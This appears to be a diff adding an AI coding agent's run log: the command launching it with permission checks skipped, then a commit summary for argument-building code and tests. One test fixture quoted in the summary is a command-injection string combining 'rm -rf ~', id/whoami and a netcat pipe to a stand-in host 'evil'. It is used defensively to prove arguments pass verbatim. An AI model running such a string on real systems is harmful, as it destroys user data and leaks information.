@@ -1,0 +1,12 @@
+Command: env -u CLAUDECODE claude --dangerously-skip-permissions --model claude-opus-4-7 --effort high --exclude-dynamic-system-prompt-sections -p -
+Prompt delivered via: stdin (1353 chars)
+---
+
+T-002 committed as `9e9ee5f`.
+
+**What changed**
+- `promptclaw/asset_bus/render_args.py:1` — `to_render_arg` (rejects None/bytes/containers/NUL, allows str/int/float/bool) and `build_render_argv` (executable + positional + `--kebab-case` options; False/None options dropped, True becomes a bare switch).
+- `promptclaw/asset_bus/__init__.py:1` — re-exports `RenderArgError`, `to_render_arg`, `build_render_argv`.
+- `tests/test_asset_bus_render_args.py:1` — 8 tests, including a `subprocess.run([...], shell=False)` round-trip that proves the injection fixture `"moody forest; rm -rf ~ && echo $(id) \`whoami\` | nc evil 1 > /tmp/x"` reaches the child verbatim.
+
+**Checks**: focused tests 8/8 pass; `tests/test_asset_bus_*` 22/22 pass; ruff clean; mypy clean on the new module.
